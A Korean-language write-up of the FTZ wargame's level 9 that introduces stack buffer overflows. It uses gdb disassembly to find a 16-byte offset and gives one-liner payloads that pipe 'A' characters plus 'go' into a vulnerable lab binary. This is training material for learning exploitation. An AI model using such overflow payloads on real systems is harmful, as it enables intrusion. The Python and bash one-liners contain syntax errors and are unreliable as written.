## FTZ level9 풀이 

------------------------------------------

#### 01 문제 파악 

버퍼 오버플로우 입문! 

스택의 구조 ; 지역 변수가 스택에 배치되는 순서와 위치를 알자 

 ![1](C:\Users\96dks\Desktop\SCP_발표ppt_2018SV\3주차_180716월\사용자료\1.png)



#### 02 의도 분석 

키보드로 입력 받거나 데이터를 넣는 부분이 없음 (buf2 배열에 값을 입력하기 불가능한 상황)

→ 강제 입력 가능  

→ 특정 값을 원하는 메모리에 덮어쓸 수 있는가?  



#### 03 나의 풀이 

![3-1](C:\Users\96dks\Desktop\SCP_발표ppt_2018SV\3주차_180716월\사용자료\3-1.JPG)

buf와 buf2 배열 사이의 더미값이 얼마인지 몰라서 buf2에 go가 들어갈 때까지 위 과정을 반복했다. 

my-pass명령어를 입력하면 패스워드가 나온다. 



#### 04 다른 풀이

스택의 구성을 파악하기 위해 buf 배열과 buf2 배열 사이의 간격을 확인해야 한다. 

1. hint 파일을 베껴와서 tmp 폴더에 bof.c를 만들었다. 
2. (1) vi 편집기를 실행하여

![1](C:\Users\96dks\Desktop\1.JPG)

2. (2) 한글을 모두 제외한 후에 

   ![2](C:\Users\96dks\Desktop\2.JPG)



3. tmp 폴더에 컴파일 하고 gdb로 열었다. 

![3](C:\Users\96dks\Desktop\3.JPG)



4. 다음에서 lea 오피코드가 있는 두 부분을 따로 떼어보면 

   ![4](C:\Users\96dks\Desktop\4.JPG)

   1. > lea  eax, [ebp-40]
      >
      > lea  eax, [ebp-24]

      40  > 24로 바뀐다. 즉 buf배열에서 16바이트를 할당 받는다는 것을 알 수 있었다. 

       따라서 buf2에 넘어가도록 buf에 16개의 문자열를 넣은 후에 buf2에 넘어가는 초기 2바이트를 go로 넣어주면 된다. 

   



#### 05 새로 알게된 것

  1) <unistd.h> 헤더 : 유닉스 계열 시스템에서 시스템 콜을 하기 위해 사용하는 헤더파일

  2) 'id' 명령어 : uid, gid, groups의 권한을 알려준다

  3) 스크립트를 이용한 문자열 입력 방법

* 배시셸의 printf명령을 이용한 방법

  > [level9@ftz tmp]$ (for i in 'seq 1 16'; do printf "A"; done; printf "go"; cat) | /usr/bin/bof 

* 펄 스크립트를 이용한 방법 

  > [level9@ftz tmp]$ (perl -e 'print "A"x16, "go"'; cat) | /usr/bin/bof 

* 파이썬 스크립트를 이용한 방법

  > [level9@ftz tmp]$ (python -c 'print "A"x16, "go"'; cat) | /usr/bin/bof 

* 루비 스크립트를 이용한 방법 

  > [level9@ftz tmp]$ (ruby -e 'print "A"x16, "go"'; cat) | /usr/bin/bof 



#### *참고자료 

* 여동기. 『문제 풀이로 배우는 시스템 해킹 테크닉』. 위키북스, 2015. 
* 우스이 토시노리 외 7인. 『CTF 정보보안 콘테스트 챌린지 북』. 위키북스, 2016. 